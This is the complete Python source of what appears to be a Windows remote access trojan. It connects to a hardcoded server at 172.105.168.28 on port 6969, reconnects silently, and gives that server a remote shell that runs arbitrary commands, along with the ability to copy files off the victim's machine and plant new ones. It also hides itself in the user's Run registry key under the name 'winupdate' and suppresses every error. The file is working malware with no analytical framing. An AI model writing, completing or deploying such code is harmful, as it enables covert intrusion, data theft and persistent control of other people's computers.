import socket
import os
import subprocess
import time 
import tempfile
import sys
import winreg
import random

def connect_server():
    global client
    global header
    global format
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)  # 10 seconds timeout for all operations
            header = 64
            format = 'utf-8'
            client.connect(("172.105.168.28", 6969))
            client.settimeout(None)  # Remove timeout after connecting if you want blocking mode
            break
        except Exception:
            time.sleep(random.randint(5, 15))  # Wait before retrying
    receive_commands()

def receive_commands():
    shell_active = False

    while True:
        msg = recieve_message(client)
        if msg is None:
            break  # Will reconnect in recieve_message
        if msg == "!openshell":
            shell_active = True

            while shell_active:
                send_message(client, os.getcwd())
                command = recieve_message(client)
                if command is None:
                    break  # Will reconnect in recieve_message
                
                if command == "!exitshell":
                    shell_active = False
                
                elif command[:2] == "cd":
                    os.chdir(command[3:])
                elif command[:9] == "!copyfile":
                    file_path = command[10:]
                    if os.path.exists(file_path):
                        send_file(client, file_path)
                elif command[:11] == "!uploadfile":
                    cwd = os.getcwd()
                    recieve_file(client, cwd)
                else:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                    output = process.stdout.read().decode('utf-8')
                    send_message(client, output)

        elif msg == "!uploadfile":
            temp_dir = tempfile.gettempdir()
            recieve_file(client, temp_dir)
        elif msg == "!shutdown":
            client.close()
            connect_server()


    
def send_message(conn, msg):
    try:
        message_bytes = msg.encode(format)
        msg_length = len(message_bytes)
        msg_byte_length = str(msg_length).encode(format)
        msg_byte_length += b' ' * (header - len(msg_byte_length))
        conn.send(msg_byte_length)
        conn.send(message_bytes)
    except Exception:
        pass  # Suppress all errors

def recieve_message(conn):
    try:
        msg_length = conn.recv(header).decode(format)
        if not msg_length:
            raise ConnectionError("Connection closed by server.")
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(format)
        return msg
    except (socket.timeout, ConnectionError, OSError):
        try:
            connect_server()
        except Exception:
            pass
        return None
    except Exception:
        return None

def send_file(conn, path):
    try:
        file_name = os.path.basename(path)
        send_message(conn, file_name)
        file_size = os.path.getsize(path)
        send_message(conn, str(file_size))

        with open(path, 'rb') as file_reader:
            while True:
                data = file_reader.read(1024)
                if not data:
                    break
                conn.send(data)
    except Exception:
        pass

def recieve_file(conn, path):
    try:
        file_name = recieve_message(conn)
        file_size = int(recieve_message(conn))
        file_path = os.path.join(path, file_name)

        with open(file_path, 'wb') as file_writer:
            bytes_received = 0
            while bytes_received < file_size:
                data = conn.recv(min(1024, file_size - bytes_received))
                if not data:
                    break
                file_writer.write(data)
                bytes_received += len(data)
    except Exception:
        pass

def add_to_startup(value_name="winupdate"):
    try:
        

        # Resolve executable path for both frozen (PyInstaller) and script run
        exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        if not os.path.isfile(exe):
            return False, "Executable not found: " + exe

        # Quote the path so spaces don't break it; append optional args
        command = f'"{exe}"'

        # Write to per-user Run key (no admin required)
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)

       

      
    except Exception as e:
        pass  # Suppress all errors


add_to_startup()
connect_server()
